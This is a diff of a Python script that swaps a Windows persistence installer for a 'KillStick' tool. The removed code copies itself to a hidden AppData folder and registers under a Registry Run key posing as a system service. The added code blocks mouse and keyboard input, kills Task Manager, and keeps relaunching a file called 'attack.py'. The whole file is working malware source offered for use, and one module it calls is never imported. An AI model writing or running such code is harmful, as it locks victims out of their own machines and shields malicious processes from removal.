@@ -1,44 +1,128 @@
-import winreg as reg
 import os
-import shutil
 import sys
+import subprocess
 import time
+import threading
+import ctypes
+import win32gui
+import win32process
+import win32api
+import psutil
+from pynput import keyboard, mouse
+from pynput.keyboard import Key, Controller as KeyboardController
+from pynput.mouse import Button, Controller as MouseController
 
-def install_persistence():
-    # Get the path of the current script (on the USB)
-    current_path = os.path.abspath(__file__)
-    
-    # Define the destination in AppData (hidden folder)
-    appdata_dir = os.environ['APPDATA']
-    dest_dir = os.path.join(appdata_dir, "SystemMonitor")
-    dest_script = os.path.join(dest_dir, "kill_stick_daemon.py")
-    
-    # Create directory if it doesn't exist
-    if not os.path.exists(dest_dir):
-        os.makedirs(dest_dir)
+# --- Configuration ---
+MALWARE_PATH = "attack.py"  # Updated to your specific file
+RESTART_DELAY = 0.5          # Seconds to wait before restarting if killed
+TASKMGR_KILL_DELAY = 1.0     # Seconds to wait after opening Task Manager to kill it
+
+class KillStick:
+    def __init__(self):
+        self.is_running = True
+        self.malware_pid = None
+        self.taskmgr_pid = None
         
-    # Copy the daemon script to the hidden location
-    # Assuming you save the code below as 'kill_stick_daemon.py'
-    # In a real scenario, you'd embed the source or copy it dynamically
-    if not os.path.exists(dest_script):
-        # If running from USB, we might need to copy the file there first
-        # For this example, we assume the file is already in the same dir
-        try:
-            shutil.copy(__file__, dest_script)
-        except Exception as e:
-            print(f"Error copying script: {e}")
-            return
+        # Install dependencies if missing
+        self.install_dependencies()
+        
+    def install_dependencies(self):
+        """Auto-installs required libraries."""
+        packages = ['pynput', 'psutil', 'pywin32']
+        for package in packages:
+            try:
+                __import__(package)
+            except ImportError:
+                print(f"[*] Installing {package}...")
+                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+                print(f"[+] {package} installed successfully.")
 
-    # Register in Windows Registry for Auto-Start
-    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    key_name = "SystemMonitorService"
-    
-    try:
-        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
-            reg.SetValueEx(key, key_name, 0, reg.REG_SZ, f'pythonw.exe "{dest_script}"')
-        print("✅ Persistence Installed: Will survive reboot.")
-    except Exception as e:
-        print(f"❌ Error installing persistence: {e}")
+    def start(self):
+        """Main execution loop"""
+        print("🔥 KILL STICK ACTIVATED 🔥")
+        print("System lockdown initiated...")
+        print("- Input hijacked (Mouse/Keyboard blocked)")
+        print("- Task Manager auto-killed")
+        print("- Malware process resurrected on death")
+        
+        # Step 1: Start input hijacker
+        hijack_thread = threading.Thread(target=self.hijack_input, daemon=True)
+        hijack_thread.start()
+        
+        # Step 2: Start Task Manager killer
+        tm_thread = threading.Thread(target=self.kill_task_manager, daemon=True)
+        tm_thread.start()
+        
+        # Step 3: Start Malware and monitor it
+        self.run_malware_loop()
+
+    def run_malware_loop(self):
+        """Runs the malware and restarts it if it closes."""
+        while self.is_running:
+            if self.malware_pid is None or not psutil.pid_exists(self.malware_pid):
+                print("[*] Launching attack.py...")
+                try:
+                    # Use python.exe to run the .py file explicitly
+                    result = subprocess.Popen(
+                        [sys.executable, MALWARE_PATH], 
+                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
+                    )
+                    self.malware_pid = result.pid
+                    print(f"[+] Attack.py running with PID: {self.malware_pid}")
+                except Exception as e:
+                    print(f"[-] Error launching attack.py: {e}")
+            
+            time.sleep(RESTART_DELAY)
+
+    def hijack_input(self):
+        """Blocks all keyboard and mouse input."""
+        print("[*] Input Hijacking Active...")
+        
+        # Block keys that might help escape (Esc, Alt+F4)
+        block_keys = [Key.esc, Key.alt_l, Key.ctrl_c]
+        
+        def on_press(key):
+            # If key is in block list, return False to stop propagation
+            if key in block_keys:
+                return False
+            return True
+
+        def on_click(x, y, button, pressed):
+            # Block all mouse clicks
+            return False
+
+        with keyboard.Listener(on_press=on_press) as k_listener, \
+             mouse.Listener(on_click=on_click) as m_listener:
+            k_listener.join()
+            m_listener.join()
+
+    def kill_task_manager(self):
+        """Monitors for Task Manager and kills it."""
+        print("[*] Task Manager Protection Active...")
+        
+        while self.is_running:
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'].lower() == 'taskmgr.exe':
+                    print("[!] Task Manager detected! Killing...")
+                    try:
+                        proc.kill()
+                    except Exception:
+                        pass
+                    
+                    # Also try to force close via Windows API
+                    try:
+                        hwnd = win32gui.FindWindow(None, "Task Manager")
+                        if hwnd:
+                            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
+                    except Exception:
+                        pass
+                        
+            time.sleep(TASKMGR_KILL_DELAY)
 
 if __name__ == "__main__":
-    install_persistence()
+    try:
+        stick = KillStick()
+        stick.start()
+    except KeyboardInterrupt:
+        print("\n[!] Force exit requested...")
+        stick.is_running = False
